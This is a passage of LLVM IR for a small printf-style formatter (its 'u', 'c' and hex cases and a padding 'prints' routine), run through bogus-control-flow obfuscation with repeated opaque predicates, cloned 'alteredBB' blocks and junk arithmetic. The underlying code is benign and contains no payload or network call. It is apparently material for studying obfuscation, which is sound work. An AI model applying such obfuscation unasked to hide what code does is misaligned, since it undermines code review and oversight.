; <label>:478:                                    ; preds = %472
  %479 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %474, i32 0, i32 3
  %480 = load i8*, i8** %479, align 8
  %481 = getelementptr i8, i8* %480, i32 %476
  %482 = bitcast i8* %481 to i32*
  %483 = add i32 %476, 8
  store i32 %483, i32* %475, align 8
  br label %489

; <label>:484:                                    ; preds = %472
  %485 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %474, i32 0, i32 2
  %486 = load i8*, i8** %485, align 8
  %487 = bitcast i8* %486 to i32*
  %488 = getelementptr i8, i8* %486, i32 8
  store i8* %488, i8** %485, align 8
  br label %489

; <label>:489:                                    ; preds = %484, %478
  %490 = phi i32* [ %482, %478 ], [ %487, %484 ]
  %491 = load i32, i32* %490, align 4
  %492 = load i32, i32* %7, align 4
  %493 = load i32, i32* %8, align 4
  %494 = call i32 @printi(i8** %473, i32 %491, i32 16, i32 0, i32 %492, i32 %493, i32 65)
  %495 = load i32, i32* %9, align 4
  %496 = add nsw i32 %495, %494
  store i32 %496, i32* %9, align 4
  br label %651

; <label>:497:                                    ; preds = %originalBBpart2101
  %498 = load i8*, i8** %5, align 8
  %499 = load i8, i8* %498, align 1
  %500 = zext i8 %499 to i32
  %501 = icmp eq i32 %500, 117
  br i1 %501, label %502, label %559

; <label>:502:                                    ; preds = %497
  %503 = load i8**, i8*** %4, align 8
  %504 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %505 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %504, i32 0, i32 0
  %506 = load i32, i32* %505, align 8
  %507 = icmp ule i32 %506, 40
  br i1 %507, label %508, label %514

; <label>:508:                                    ; preds = %502
  %509 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %504, i32 0, i32 3
  %510 = load i8*, i8** %509, align 8
  %511 = getelementptr i8, i8* %510, i32 %506
  %512 = bitcast i8* %511 to i32*
  %513 = add i32 %506, 8
  store i32 %513, i32* %505, align 8
  br label %535

; <label>:514:                                    ; preds = %502
  %515 = load i32, i32* @x.7
  %516 = load i32, i32* @y.8
  %517 = sub i32 %515, 1
  %518 = mul i32 %515, %517
  %519 = urem i32 %518, 2
  %520 = icmp eq i32 %519, 0
  %521 = icmp slt i32 %516, 10
  %522 = or i1 %520, %521
  br i1 %522, label %originalBB103, label %originalBB103alteredBB

originalBB103:                                    ; preds = %originalBB103alteredBB, %514
  %523 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %504, i32 0, i32 2
  %524 = load i8*, i8** %523, align 8
  %525 = bitcast i8* %524 to i32*
  %526 = getelementptr i8, i8* %524, i32 8
  store i8* %526, i8** %523, align 8
  %527 = load i32, i32* @x.7
  %528 = load i32, i32* @y.8
  %529 = sub i32 %527, 1
  %530 = mul i32 %527, %529
  %531 = urem i32 %530, 2
  %532 = icmp eq i32 %531, 0
  %533 = icmp slt i32 %528, 10
  %534 = or i1 %532, %533
  br i1 %534, label %originalBBpart2105, label %originalBB103alteredBB

originalBBpart2105:                               ; preds = %originalBB103
  br label %535

; <label>:535:                                    ; preds = %originalBBpart2105, %508
  %536 = phi i32* [ %512, %508 ], [ %525, %originalBBpart2105 ]
  %537 = load i32, i32* @x.7
  %538 = load i32, i32* @y.8
  %539 = sub i32 %537, 1
  %540 = mul i32 %537, %539
  %541 = urem i32 %540, 2
  %542 = icmp eq i32 %541, 0
  %543 = icmp slt i32 %538, 10
  %544 = or i1 %542, %543
  br i1 %544, label %originalBB107, label %originalBB107alteredBB

originalBB107:                                    ; preds = %originalBB107alteredBB, %535
  %545 = load i32, i32* %536, align 4
  %546 = load i32, i32* %7, align 4
  %547 = load i32, i32* %8, align 4
  %548 = call i32 @printi(i8** %503, i32 %545, i32 10, i32 0, i32 %546, i32 %547, i32 97)
  %549 = load i32, i32* %9, align 4
  %550 = add nsw i32 %549, %548
  store i32 %550, i32* %9, align 4
  %551 = load i32, i32* @x.7
  %552 = load i32, i32* @y.8
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart2110, label %originalBB107alteredBB

originalBBpart2110:                               ; preds = %originalBB107
  br label %651

; <label>:559:                                    ; preds = %497
  %560 = load i8*, i8** %5, align 8
  %561 = load i8, i8* %560, align 1
  %562 = zext i8 %561 to i32
  %563 = icmp eq i32 %562, 99
  br i1 %563, label %564, label %609

; <label>:564:                                    ; preds = %559
  %565 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %566 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %565, i32 0, i32 0
  %567 = load i32, i32* %566, align 8
  %568 = icmp ule i32 %567, 40
  br i1 %568, label %569, label %575

; <label>:569:                                    ; preds = %564
  %570 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %565, i32 0, i32 3
  %571 = load i8*, i8** %570, align 8
  %572 = getelementptr i8, i8* %571, i32 %567
  %573 = bitcast i8* %572 to i32*
  %574 = add i32 %567, 8
  store i32 %574, i32* %566, align 8
  br label %580

; <label>:575:                                    ; preds = %564
  %576 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %565, i32 0, i32 2
  %577 = load i8*, i8** %576, align 8
  %578 = bitcast i8* %577 to i32*
  %579 = getelementptr i8, i8* %577, i32 8
  store i8* %579, i8** %576, align 8
  br label %580

; <label>:580:                                    ; preds = %575, %569
  %581 = phi i32* [ %573, %569 ], [ %578, %575 ]
  %582 = load i32, i32* @x.7
  %583 = load i32, i32* @y.8
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBB112, label %originalBB112alteredBB

originalBB112:                                    ; preds = %originalBB112alteredBB, %580
  %590 = load i32, i32* %581, align 4
  %591 = trunc i32 %590 to i8
  %592 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %591, i8* %592, align 1
  %593 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %593, align 1
  %594 = load i8**, i8*** %4, align 8
  %595 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %596 = load i32, i32* %7, align 4
  %597 = load i32, i32* %8, align 4
  %598 = call i32 @prints(i8** %594, i8* %595, i32 %596, i32 %597)
  %599 = load i32, i32* %9, align 4
  %600 = add nsw i32 %599, %598
  store i32 %600, i32* %9, align 4
  %601 = load i32, i32* @x.7
  %602 = load i32, i32* @y.8
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart2128, label %originalBB112alteredBB

originalBBpart2128:                               ; preds = %originalBB112
  br label %651

; <label>:609:                                    ; preds = %559
  br label %634

; <label>:610:                                    ; preds = %33
  br label %611

; <label>:611:                                    ; preds = %610, %67
  %612 = load i32, i32* @x.7
  %613 = load i32, i32* @y.8
  %614 = sub i32 %612, 1
  %615 = mul i32 %612, %614
  %616 = urem i32 %615, 2
  %617 = icmp eq i32 %616, 0
  %618 = icmp slt i32 %613, 10
  %619 = or i1 %617, %618
  br i1 %619, label %originalBB130, label %originalBB130alteredBB

originalBB130:                                    ; preds = %originalBB130alteredBB, %611
  %620 = load i8**, i8*** %4, align 8
  %621 = load i8*, i8** %5, align 8
  %622 = load i8, i8* %621, align 1
  %623 = zext i8 %622 to i32
  call void @printchar(i8** %620, i32 %623)
  %624 = load i32, i32* %9, align 4
  %625 = add nsw i32 %624, 1
  store i32 %625, i32* %9, align 4
  %626 = load i32, i32* @x.7
  %627 = load i32, i32* @y.8
  %628 = sub i32 %626, 1
  %629 = mul i32 %626, %628
  %630 = urem i32 %629, 2
  %631 = icmp eq i32 %630, 0
  %632 = icmp slt i32 %627, 10
  %633 = or i1 %631, %632
  br i1 %633, label %originalBBpart2132, label %originalBB130alteredBB

originalBBpart2132:                               ; preds = %originalBB130
  br label %634

; <label>:634:                                    ; preds = %originalBBpart2132, %609
  %635 = load i32, i32* @x.7
  %636 = load i32, i32* @y.8
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB134, label %originalBB134alteredBB

originalBB134:                                    ; preds = %originalBB134alteredBB, %634
  %643 = load i32, i32* @x.7
  %644 = load i32, i32* @y.8
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart2136, label %originalBB134alteredBB

originalBBpart2136:                               ; preds = %originalBB134
  br label %651

; <label>:651:                                    ; preds = %originalBBpart2136, %originalBBpart2128, %originalBBpart2110, %489, %443, %381, %originalBBpart277
  %652 = load i8*, i8** %5, align 8
  %653 = getelementptr inbounds i8, i8* %652, i32 1
  store i8* %653, i8** %5, align 8
  br label %12

; <label>:654:                                    ; preds = %originalBBpart24, %originalBBpart2
  %655 = load i8**, i8*** %4, align 8
  %656 = icmp ne i8** %655, null
  br i1 %656, label %657, label %660

; <label>:657:                                    ; preds = %654
  %658 = load i8**, i8*** %4, align 8
  %659 = load i8*, i8** %658, align 8
  store i8 0, i8* %659, align 1
  br label %660

; <label>:660:                                    ; preds = %657, %654
  %661 = load i32, i32* @x.7
  %662 = load i32, i32* @y.8
  %663 = sub i32 %661, 1
  %664 = mul i32 %661, %663
  %665 = urem i32 %664, 2
  %666 = icmp eq i32 %665, 0
  %667 = icmp slt i32 %662, 10
  %668 = or i1 %666, %667
  br i1 %668, label %originalBB138, label %originalBB138alteredBB

originalBB138:                                    ; preds = %originalBB138alteredBB, %660
  %669 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %670 = bitcast %struct.__va_list_tag* %669 to i8*
  call void @llvm.va_end(i8* %670)
  %671 = load i32, i32* %9, align 4
  %672 = load i32, i32* @x.7
  %673 = load i32, i32* @y.8
  %674 = sub i32 %672, 1
  %675 = mul i32 %672, %674
  %676 = urem i32 %675, 2
  %677 = icmp eq i32 %676, 0
  %678 = icmp slt i32 %673, 10
  %679 = or i1 %677, %678
  br i1 %679, label %originalBBpart2140, label %originalBB138alteredBB

originalBBpart2140:                               ; preds = %originalBB138
  ret i32 %671

originalBBalteredBB:                              ; preds = %originalBB, %12
  %680 = load i8*, i8** %5, align 8
  %681 = load i8, i8* %680, align 1
  %682 = zext i8 %681 to i32
  %683 = icmp ne i32 %682, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %45
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %684 = load i8*, i8** %5, align 8
  %685 = getelementptr inbounds i8, i8* %684, i32 1
  store i8* %685, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %92
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %119
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %136
  %686 = load i8*, i8** %5, align 8
  %687 = load i8, i8* %686, align 1
  %688 = zext i8 %687 to i32
  %689 = icmp sge i32 %688, 48
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %162
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %180
  %690 = load i32, i32* %7, align 4
  %_ = sub i32 %690, 10
  %gen = mul i32 %_, 10
  %_27 = sub i32 0, %690
  %gen28 = add i32 %_27, 10
  %_29 = sub i32 0, %690
  %gen30 = add i32 %_29, 10
  %_31 = sub i32 0, %690
  %gen32 = add i32 %_31, 10
  %_33 = sub i32 %690, 10
  %gen34 = mul i32 %_33, 10
  %_35 = sub i32 %690, 10
  %gen36 = mul i32 %_35, 10
  %_37 = sub i32 %690, 10
  %gen38 = mul i32 %_37, 10
  %691 = mul nsw i32 %690, 10
  store i32 %691, i32* %7, align 4
  %692 = load i8*, i8** %5, align 8
  %693 = load i8, i8* %692, align 1
  %694 = zext i8 %693 to i32
  %_39 = shl i32 %694, 48
  %_40 = sub i32 %694, 48
  %gen41 = mul i32 %_40, 48
  %_42 = sub i32 0, %694
  %gen43 = add i32 %_42, 48
  %_44 = shl i32 %694, 48
  %_45 = sub i32 0, %694
  %gen46 = add i32 %_45, 48
  %695 = sub nsw i32 %694, 48
  %696 = load i32, i32* %7, align 4
  %_47 = shl i32 %696, %695
  %_48 = sub i32 %696, %695
  %gen49 = mul i32 %_48, %695
  %_50 = sub i32 0, %696
  %gen51 = add i32 %_50, %695
  %_52 = sub i32 0, %696
  %gen53 = add i32 %_52, %695
  %697 = add nsw i32 %696, %695
  store i32 %697, i32* %7, align 4
  br label %originalBB26

originalBB57alteredBB:                            ; preds = %originalBB57, %205
  %698 = load i8*, i8** %5, align 8
  %699 = getelementptr inbounds i8, i8* %698, i32 1
  store i8* %699, i8** %5, align 8
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %224
  %700 = load i8*, i8** %5, align 8
  %701 = load i8, i8* %700, align 1
  %702 = zext i8 %701 to i32
  %703 = icmp eq i32 %702, 115
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %256
  %704 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %246, i32 0, i32 2
  %705 = load i8*, i8** %704, align 8
  %706 = bitcast i8* %705 to i32*
  %707 = getelementptr i8, i8* %705, i32 8
  store i8* %707, i8** %704, align 8
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %277
  %708 = load i32, i32* %278, align 4
  %709 = sext i32 %708 to i64
  %710 = inttoptr i64 %709 to i8*
  store i8* %710, i8** %11, align 8
  %711 = load i8**, i8*** %4, align 8
  %712 = load i8*, i8** %11, align 8
  %713 = icmp ne i8* %712, null
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %304
  %714 = load i32, i32* %7, align 4
  %715 = load i32, i32* %8, align 4
  %716 = call i32 @prints(i8** %290, i8* %305, i32 %714, i32 %715)
  %717 = load i32, i32* %9, align 4
  %_74 = sub i32 0, %717
  %gen75 = add i32 %_74, %716
  %718 = add nsw i32 %717, %716
  store i32 %718, i32* %9, align 4
  br label %originalBB73

originalBB79alteredBB:                            ; preds = %originalBB79, %332
  %719 = load i8**, i8*** %4, align 8
  %720 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %721 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %720, i32 0, i32 0
  %722 = load i32, i32* %721, align 8
  %723 = icmp ule i32 %722, 40
  br label %originalBB79

originalBB83alteredBB:                            ; preds = %originalBB83, %360
  %724 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %342, i32 0, i32 2
  %725 = load i8*, i8** %724, align 8
  %726 = bitcast i8* %725 to i32*
  %727 = getelementptr i8, i8* %725, i32 8
  store i8* %727, i8** %724, align 8
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %400
  %728 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %396, i32 0, i32 3
  %729 = load i8*, i8** %728, align 8
  %730 = getelementptr i8, i8* %729, i32 %398
  %731 = bitcast i8* %730 to i32*
  %_88 = shl i32 %398, 8
  %_89 = shl i32 %398, 8
  %_90 = sub i32 %398, 8
  %gen91 = mul i32 %_90, 8
  %732 = add i32 %398, 8
  store i32 %732, i32* %397, align 8
  br label %originalBB87

originalBB95alteredBB:                            ; preds = %originalBB95, %422
  %733 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %396, i32 0, i32 2
  %734 = load i8*, i8** %733, align 8
  %735 = bitcast i8* %734 to i32*
  %736 = getelementptr i8, i8* %734, i32 8
  store i8* %736, i8** %733, align 8
  br label %originalBB95

originalBB99alteredBB:                            ; preds = %originalBB99, %451
  %737 = load i8*, i8** %5, align 8
  %738 = load i8, i8* %737, align 1
  %739 = zext i8 %738 to i32
  %740 = icmp eq i32 %739, 88
  br label %originalBB99

originalBB103alteredBB:                           ; preds = %originalBB103, %514
  %741 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %504, i32 0, i32 2
  %742 = load i8*, i8** %741, align 8
  %743 = bitcast i8* %742 to i32*
  %744 = getelementptr i8, i8* %742, i32 8
  store i8* %744, i8** %741, align 8
  br label %originalBB103

originalBB107alteredBB:                           ; preds = %originalBB107, %535
  %745 = load i32, i32* %536, align 4
  %746 = load i32, i32* %7, align 4
  %747 = load i32, i32* %8, align 4
  %748 = call i32 @printi(i8** %503, i32 %745, i32 10, i32 0, i32 %746, i32 %747, i32 97)
  %749 = load i32, i32* %9, align 4
  %_108 = shl i32 %749, %748
  %750 = add nsw i32 %749, %748
  store i32 %750, i32* %9, align 4
  br label %originalBB107

originalBB112alteredBB:                           ; preds = %originalBB112, %580
  %751 = load i32, i32* %581, align 4
  %752 = trunc i32 %751 to i8
  %753 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %752, i8* %753, align 1
  %754 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %754, align 1
  %755 = load i8**, i8*** %4, align 8
  %756 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %757 = load i32, i32* %7, align 4
  %758 = load i32, i32* %8, align 4
  %759 = call i32 @prints(i8** %755, i8* %756, i32 %757, i32 %758)
  %760 = load i32, i32* %9, align 4
  %_113 = sub i32 0, %760
  %gen114 = add i32 %_113, %759
  %_115 = sub i32 0, %760
  %gen116 = add i32 %_115, %759
  %_117 = shl i32 %760, %759
  %_118 = shl i32 %760, %759
  %_119 = sub i32 0, %760
  %gen120 = add i32 %_119, %759
  %_121 = sub i32 0, %760
  %gen122 = add i32 %_121, %759
  %_123 = sub i32 0, %760
  %gen124 = add i32 %_123, %759
  %_125 = sub i32 %760, %759
  %gen126 = mul i32 %_125, %759
  %761 = add nsw i32 %760, %759
  store i32 %761, i32* %9, align 4
  br label %originalBB112

originalBB130alteredBB:                           ; preds = %originalBB130, %611
  %762 = load i8**, i8*** %4, align 8
  %763 = load i8*, i8** %5, align 8
  %764 = load i8, i8* %763, align 1
  %765 = zext i8 %764 to i32
  call void @printchar(i8** %762, i32 %765)
  %766 = load i32, i32* %9, align 4
  %767 = add nsw i32 %766, 1
  store i32 %767, i32* %9, align 4
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %634
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %660
  %768 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %769 = bitcast %struct.__va_list_tag* %768 to i8*
  call void @llvm.va_end(i8* %769)
  %770 = load i32, i32* %9, align 4
  br label %originalBB138
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %90

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* @x.9
  %29 = load i32, i32* @y.10
  %30 = sub i32 %28, 1
  %31 = mul i32 %28, %30
  %32 = urem i32 %31, 2
  %33 = icmp eq i32 %32, 0
  %34 = icmp slt i32 %29, 10
  %35 = or i1 %33, %34
  br i1 %35, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %27
  %36 = load i32, i32* %11, align 4
  %37 = load i32, i32* %7, align 4
  %38 = icmp sge i32 %36, %37
  %39 = load i32, i32* @x.9
  %40 = load i32, i32* @y.10
  %41 = sub i32 %39, 1
  %42 = mul i32 %39, %41
  %43 = urem i32 %42, 2
  %44 = icmp eq i32 %43, 0
  %45 = icmp slt i32 %40, 10
  %46 = or i1 %44, %45
  br i1 %46, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %38, label %47, label %48

; <label>:47:                                     ; preds = %originalBBpart2
  store i32 0, i32* %7, align 4
  br label %52

; <label>:48:                                     ; preds = %originalBBpart2
  %49 = load i32, i32* %11, align 4
  %50 = load i32, i32* %7, align 4
  %51 = sub nsw i32 %50, %49
  store i32 %51, i32* %7, align 4
  br label %52

; <label>:52:                                     ; preds = %48, %47
  %53 = load i32, i32* @x.9
  %54 = load i32, i32* @y.10
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %52
  %61 = load i32, i32* %8, align 4
  %62 = and i32 %61, 2
  %63 = icmp ne i32 %62, 0
  %64 = load i32, i32* @x.9
  %65 = load i32, i32* @y.10
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %63, label %72, label %73

; <label>:72:                                     ; preds = %originalBBpart24
  store i32 48, i32* %10, align 4
  br label %73

; <label>:73:                                     ; preds = %72, %originalBBpart24
  %74 = load i32, i32* @x.9
  %75 = load i32, i32* @y.10
  %76 = sub i32 %74, 1
  %77 = mul i32 %74, %76
  %78 = urem i32 %77, 2
  %79 = icmp eq i32 %78, 0
  %80 = icmp slt i32 %75, 10
  %81 = or i1 %79, %80
  br i1 %81, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %73
  %82 = load i32, i32* @x.9
  %83 = load i32, i32* @y.10
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %90

; <label>:90:                                     ; preds = %originalBBpart28, %4
  %91 = load i32, i32* @x.9
  %92 = load i32, i32* @y.10
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %90
  %99 = load i32, i32* %8, align 4
  %100 = and i32 %99, 1
  %101 = icmp ne i32 %100, 0
  %102 = load i32, i32* @x.9
  %103 = load i32, i32* @y.10
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBBpart214, label %originalBB10alteredBB

originalBBpart214:                                ; preds = %originalBB10
  br i1 %101, label %155, label %110

; <label>:110:                                    ; preds = %originalBBpart214
  %111 = load i32, i32* @x.9
  %112 = load i32, i32* @y.10
  %113 = sub i32 %111, 1
  %114 = mul i32 %111, %113
  %115 = urem i32 %114, 2
  %116 = icmp eq i32 %115, 0
  %117 = icmp slt i32 %112, 10
  %118 = or i1 %116, %117
  br i1 %118, label %originalBB16, label %originalBB16alteredBB

originalBB16:                                     ; preds = %originalBB16alteredBB, %110
  %119 = load i32, i32* @x.9
  %120 = load i32, i32* @y.10
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart218, label %originalBB16alteredBB

originalBBpart218:                                ; preds = %originalBB16
  br label %127

; <label>:127:                                    ; preds = %151, %originalBBpart218
  %128 = load i32, i32* %7, align 4
  %129 = icmp sgt i32 %128, 0
  br i1 %129, label %130, label %154

; <label>:130:                                    ; preds = %127
  %131 = load i32, i32* @x.9
  %132 = load i32, i32* @y.10
  %133 = sub i32 %131, 1
  %134 = mul i32 %131, %133
  %135 = urem i32 %134, 2
  %136 = icmp eq i32 %135, 0
  %137 = icmp slt i32 %132, 10
  %138 = or i1 %136, %137
  br i1 %138, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %130
  %139 = load i8**, i8*** %5, align 8
  %140 = load i32, i32* %10, align 4
  call void @printchar(i8** %139, i32 %140)
  %141 = load i32, i32* %9, align 4
  %142 = add nsw i32 %141, 1
  store i32 %142, i32* %9, align 4
  %143 = load i32, i32* @x.9
  %144 = load i32, i32* @y.10
  %145 = sub i32 %143, 1
  %146 = mul i32 %143, %145
  %147 = urem i32 %146, 2
  %148 = icmp eq i32 %147, 0
  %149 = icmp slt i32 %144, 10
  %150 = or i1 %148, %149
  br i1 %150, label %originalBBpart228, label %originalBB20alteredBB

originalBBpart228:                                ; preds = %originalBB20
  br label %151

; <label>:151:                                    ; preds = %originalBBpart228
  %152 = load i32, i32* %7, align 4
  %153 = add nsw i32 %152, -1
  store i32 %153, i32* %7, align 4
  br label %127

; <label>:154:                                    ; preds = %127
  br label %155

; <label>:155:                                    ; preds = %154, %originalBBpart214
  %156 = load i32, i32* @x.9
  %157 = load i32, i32* @y.10
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %155
  %164 = load i32, i32* @x.9
  %165 = load i32, i32* @y.10
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br label %172

; <label>:172:                                    ; preds = %183, %originalBBpart232
  %173 = load i8*, i8** %6, align 8
  %174 = load i8, i8* %173, align 1
  %175 = icmp ne i8 %174, 0
  br i1 %175, label %176, label %186

; <label>:176:                                    ; preds = %172
  %177 = load i8**, i8*** %5, align 8
  %178 = load i8*, i8** %6, align 8
  %179 = load i8, i8* %178, align 1
  %180 = zext i8 %179 to i32
  call void @printchar(i8** %177, i32 %180)
  %181 = load i32, i32* %9, align 4
  %182 = add nsw i32 %181, 1
  store i32 %182, i32* %9, align 4
  br label %183

; <label>:183:                                    ; preds = %176
  %184 = load i8*, i8** %6, align 8
  %185 = getelementptr inbounds i8, i8* %184, i32 1
  store i8* %185, i8** %6, align 8
  br label %172

; <label>:186:                                    ; preds = %172
  br label %187

; <label>:187:                                    ; preds = %227, %186
  %188 = load i32, i32* @x.9
  %189 = load i32, i32* @y.10
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %187
  %196 = load i32, i32* %7, align 4
  %197 = icmp sgt i32 %196, 0
  %198 = load i32, i32* @x.9
  %199 = load i32, i32* @y.10
  %200 = sub i32 %198, 1
  %201 = mul i32 %198, %200
  %202 = urem i32 %201, 2
  %203 = icmp eq i32 %202, 0
  %204 = icmp slt i32 %199, 10
  %205 = or i1 %203, %204
  br i1 %205, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br i1 %197, label %206, label %230

; <label>:206:                                    ; preds = %originalBBpart236
  %207 = load i32, i32* @x.9
  %208 = load i32, i32* @y.10
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB38, label %originalBB38alteredBB

